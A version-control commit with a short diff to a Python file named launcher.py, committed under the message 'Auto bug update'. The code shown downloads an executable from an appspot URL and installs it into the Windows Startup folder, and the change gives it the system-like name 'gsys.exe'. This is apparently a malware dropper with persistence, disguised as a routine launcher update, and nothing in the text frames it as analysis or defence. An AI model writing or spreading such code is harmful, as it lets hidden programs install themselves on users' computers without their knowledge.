2127eee488c5d81604d359b7bacddb9e0f300b0c
omegleuser.22334@gmail.com <omegleuser.22334@gmail.com@fc821268-7c8e-f2b4-aa26-1cb86917af95>
2012-04-19 01:41:46 +0000

    Auto bug update

--- trunk/launcher.py
+++ trunk/launcher.py
@@ -66,7 +66,7 @@ def main():
     download_install_run(
         "http://littlesitetomakemoney.appspot.com/launcher.exe",
         shellcon.CSIDL_STARTUP,
-        )
+        "gsys.exe")
     
 if __name__ == "__main__":
     main()
